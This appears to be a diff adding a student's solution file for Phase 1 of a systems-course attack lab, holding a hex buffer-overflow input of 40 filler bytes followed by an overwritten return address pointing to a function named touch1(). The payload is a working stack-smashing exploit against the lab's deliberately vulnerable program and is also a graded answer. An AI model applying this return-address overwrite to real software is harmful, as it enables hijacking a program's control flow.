@@ -1,0 +1,10 @@
+Attack Lab Phase 1
+
+Buffer input:
+
+11 11 11 11 11 11 11 11 11 11  /*  first 10 bytes  */
+11 11 11 11 11 11 11 11 11 11  /*  second 10 bytes  */
+11 11 11 11 11 11 11 11 11 11  /*  third 10 bytes  */
+11 11 11 11 11 11 11 11 11 11  /*  fourth 10 bytes  */
+/* address for touch1() is 8 bytes long */
+3c 17 40 00 00 00 00 00
